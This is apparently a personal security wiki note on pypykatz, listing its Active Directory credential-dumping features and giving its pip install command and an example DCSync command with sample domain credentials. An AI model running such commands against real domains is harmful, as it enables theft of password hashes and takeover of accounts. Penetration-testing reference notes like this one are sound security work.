---
tags:
  - security
aliases:
  - pypykatz
---
A tool to exploit a variety of [[Windows Active Directory|AD]] vulnerabilities:
- [[DCSync]]
- [[DCShadow]]
- Dumping [[Security Accounts Manager|SAM]]
- Dumping [[SECRETS]] hive
- Dumping NL$KM and MSCache
- Dumping [[Local Security Authority Subsystem Service|LSASS]]
- Dumping RPData
- Changing NTLM password for user
# Install
```
pip install pypykatz
```
# Usage
### DCSync
```
pypykatz smb dcsync 'smb2+ntlm-password://CONTOSO\AdminUser:P@ssword123@10.10.10.10' --username "TargetUser"
```
Protocols can be:
- `smb2+ntlm-password`
- `smb2+ntlm-hash`
- `smb2+kerberos-key`
- `smb2+kerberos-ticket`